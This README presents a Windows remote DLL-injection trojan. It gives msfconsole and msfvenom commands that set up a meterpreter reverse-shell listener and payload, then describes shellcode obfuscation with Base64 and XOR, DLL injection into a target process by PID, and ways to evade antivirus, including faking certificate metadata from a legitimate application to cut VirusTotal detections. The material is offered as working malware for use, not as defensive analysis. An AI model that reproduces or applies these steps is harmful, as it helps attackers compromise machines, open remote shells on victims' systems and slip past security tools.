# Remote Dll injector Trojan
Trojan using dll injection of a custom library that spawns a shell on a target machine, undetected by Windows defender and Bitdefener

# 💻 Code

This malware injects a malicious library into a target process or directly creates a process and uploads the library into it, the dll contains a simple encoded base64 data that spawns a reverse shell.

### 0) Listener and payload

- First i used the classic multi handler exploit to run the payload: 
``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```

- The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 

- Once we have the shellcode we load it into the ``` encrypter.c```  file, where the binary data is converted into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more, secondly XOR encryption is applied using a single-byte key, and finally we convert it into its hexadecimal string representation.

### 1) DLL
The malicious library contains 4 different call cases, process attach/detach, and thread create/delete, the best one is in my opinion the first one. When the library is attached to the process, it runs arbitrary code, in the sample there is a simple windows message box, in the actual dll the code decodes base64 encoded data and uploads the shellcode containing the reverse shell to memory. You can create a dll on Visual Studio by making a new project and selecting the dll template, also rememeber to build both the dll and the injector in release mode and in the same architecture.

### 2) Local Injection

The local injection takes the dynamic library which is already located into the disk (basically useless, just a sample), creates a process and injects the library into it. Here is a detailed explanation: 

- First we locate the dll and we load it into the same process that runs it; 
- Then we create a thread and execute whatever we want, for example calling a function from inside the dll or running multiple tasks;

Because our dll is executed by the main function of our process, the thread isn't mandatory, you can use it for example to call a function from the dll if it needs to run in the background or loop continuously. 

### 2.1) Remote Injection

The remote injection dumps the dynamic library into disk (might get detected tho as anything that gets written into disk is automathically scanned by the antivirus), looks for a specific process and injects the library into it. Here is a detailed explanation: 

- First of all we put the malicious dll in the same folder as the injector, we create a resource file and its header and we set the dll as a resource of the injector;
- Secondly on the injector we locate the resource file, calculate its size, upload it to memory, and lock it for access so it can be used without being moved;
- Thirdly we extract the dll from the executable and write it to disk;
- We find a process by PID, allocate memory the size of the dll path inside of it and write the path into the process;
- Then we get the base address of kernel32 dll to get the pointer of the function which will load the malicious library;
- Finally we create a thread that executes the function that loads the malicious dll;

### 3) Reverse shell

The actual dll contains the encrypted shellcode with the reverse shell, here's how it works:
- First the ...


# 🛡 Obfuscation and AV Detection 

<img align="right" src="media/av1.png" width="340" />

Both codes are undetected by Windows defender. The remote injection exe on virustotal got 10 detections, but using a simple certificate and metadata manager like Process Hacker (free an open source) i uploaded the data of a common app (in my case it was github desktop setup) and the AVs detections went from 10 to 1 in an instant, and for the first time Bitdefender didn't flag it as suspicious 😀!!! The file went from a few kilobytes to like 10mb tho so i think i'll have to work on that, maybe by embedding only the essential metadata and certificates.


<img align="left" src="media/av4.png" width="540" />
